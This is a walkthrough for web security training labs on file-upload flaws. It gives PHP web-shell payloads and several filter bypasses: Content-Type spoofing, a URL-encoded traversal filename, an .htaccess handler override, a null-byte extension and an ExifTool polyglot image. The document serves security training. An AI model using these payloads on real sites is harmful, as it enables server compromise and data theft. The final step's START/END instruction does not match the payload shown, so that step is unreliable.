**Step 1 — Identify the lab type**

- Log in as `wiener:peter`. Navigate to your account page and try uploading a plain `exploit.php` file as your avatar. Note what happens:

| What you observe                                        | Lab type                                   |
| ------------------------------------------------------- | ------------------------------------------ |
| PHP uploads and executes fine                           | Remote code execution via web shell upload |
| Rejected — only `image/jpeg` or `image/png` allowed     | Content-Type restriction bypass            |
| PHP accepted but returns as plain text (not executed)   | Path traversal                             |
| `.php` extension is blocked, Apache server in headers   | Extension blacklist bypass                 |
| Only JPG/PNG allowed but extension-based check          | Obfuscated file extension                  |
| Rejected — server validates the file is a genuine image | Polyglot web shell upload                  |

💡 Always check the error message carefully — it usually reveals exactly what the filter is checking (Content-Type, extension, or file contents).

---

**If PHP executes directly → Remote code execution via web shell upload**

- Upload `exploit.php` with content `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- In Burp Repeater, `GET /files/avatars/exploit.php` → copy the secret → submit ✅

---

**If rejected due to Content-Type → Content-Type restriction bypass**

- Upload `exploit.php`, intercept the `POST /my-account/avatar` request in Burp Proxy > HTTP history → send to Repeater
- In the multipart body, change the file part's `Content-Type` from `application/x-php` to `image/jpeg`
- Send → confirm upload success → `GET /files/avatars/exploit.php` in Repeater → copy secret → submit ✅

---

**If PHP uploads but executes as plain text → Path traversal**

- Find `POST /my-account/avatar` in HTTP history → send to Repeater
- Change `filename="exploit.php"` to `filename="..%2fexploit.php"` in the `Content-Disposition` header 💡 Plain `../` gets stripped — URL-encoding the slash bypasses the sanitisation
- Send → confirm response shows `avatars/../exploit.php`
- `GET /files/exploit.php` in Repeater → copy secret → submit ✅

---

**If `.php` is blocked and Apache server headers visible → Extension blacklist bypass**

- Find `POST /my-account/avatar` → send to Repeater
- First upload — modify the request to send an `.htaccess` file:

```
  filename=".htaccess"
  Content-Type: text/plain
  
  AddType application/x-httpd-php .l33t
```

- Second upload — send the PHP payload with extension `.l33t`:

```
  filename="exploit.l33t"
  <?php echo file_get_contents('/home/carlos/secret'); ?>
```

- `GET /files/avatars/exploit.l33t` in Repeater → copy secret → submit ✅

---

**If only JPG/PNG allowed via extension check → Obfuscated file extension**

- Find `POST /my-account/avatar` → send to Repeater
- Change filename to `exploit.php%00.jpg` (null byte before `.jpg`) 💡 The null byte truncates the string — server sees `.jpg` for validation but saves as `.php`
- Send → confirm response refers to file as `exploit.php`
- `GET /files/avatars/exploit.php` in Repeater → copy secret → submit ✅

---

**If server validates genuine image contents → Polyglot web shell upload**

- Install ExifTool and download a valid JPEG:

bash

```bash
  sudo apt install libimage-exiftool-perl
  curl -o image.jpg https://via.placeholder.com/150
```

- Embed the PHP payload into the image metadata:

```bash
  exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" image.jpg -o polyglot.php
```

- Upload `polyglot.php` as your avatar — it passes the image check
- In Burp Proxy > HTTP history, find `GET /files/avatars/polyglot.php` → search for `START` in the response binary data → copy the secret between `START` and `END` → submit ✅


